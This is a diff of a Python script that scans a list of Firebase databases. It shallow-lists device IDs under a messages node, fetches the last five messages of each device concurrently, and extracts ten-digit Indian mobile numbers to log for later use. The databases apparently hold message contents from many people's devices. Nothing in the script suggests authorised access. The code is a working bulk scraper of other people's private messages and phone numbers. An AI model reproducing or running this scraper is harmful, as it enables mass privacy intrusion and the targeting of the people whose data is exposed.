@@ -59,24 +59,52 @@ def save_result(phone, status, link=""):
         ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         f.write(f"{ts} | {phone} | {status} | {link}\n")
 
+PHONE_RE = re.compile(r'(?<!\d)([6-9]\d{9})(?!\d)')
+
+def extract_phone(text):
+    m = PHONE_RE.search(normalize(str(text)))
+    return m.group(1) if m else None
+
 async def get_devices(session):
     devices = []
     for fb_base in FIREBASE_URLS:
         db_name = fb_base.split("//")[-1].split(".")[0]
         try:
-            async with session.get(fb_url(fb_base, "clients.json"),
+            # Shallow scan — get all device IDs fast
+            async with session.get(fb_url(fb_base, "messages.json", "shallow=true"),
                                    timeout=aiohttp.ClientTimeout(total=20)) as r:
-                data = await r.json()
-            if not isinstance(data, dict):
+                shallow = await r.json()
+            if not isinstance(shallow, dict):
                 continue
-            for dev_id, info in data.items():
-                if not isinstance(info, dict):
-                    continue
-                phone = str(info.get("phone") or info.get("number") or
-                            info.get("mobile") or "").strip().lstrip("+").lstrip("91")
-                if len(phone) == 10:
-                    devices.append({"device_id": dev_id, "phone": phone,
-                                    "fb_base": fb_base, "db_name": db_name})
+
+            # For each device get last 5 messages, extract phone
+            sem = asyncio.Semaphore(20)
+            results = []
+
+            async def scan_one(dev_id):
+                async with sem:
+                    try:
+                        url = fb_url(fb_base, f"messages/{dev_id}.json",
+                                     "orderBy=%22%24key%22&limitToLast=5")
+                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
+                            msgs = await r.json()
+                        if not isinstance(msgs, dict):
+                            return
+                        for msg_data in msgs.values():
+                            if not isinstance(msg_data, dict):
+                                continue
+                            text = msg_data.get("message", "") or msg_data.get("body", "") or str(msg_data)
+                            phone = extract_phone(text)
+                            if phone:
+                                results.append({"device_id": dev_id, "phone": phone,
+                                                "fb_base": fb_base, "db_name": db_name})
+                                return
+                    except Exception:
+                        pass
+
+            await asyncio.gather(*[scan_one(did) for did in shallow.keys()])
+            devices.extend(results)
+            print(f"  {db_name}: {len(results)} devices found")
         except Exception as e:
             print(f"  ⚠ {db_name}: {e}")
     return devices
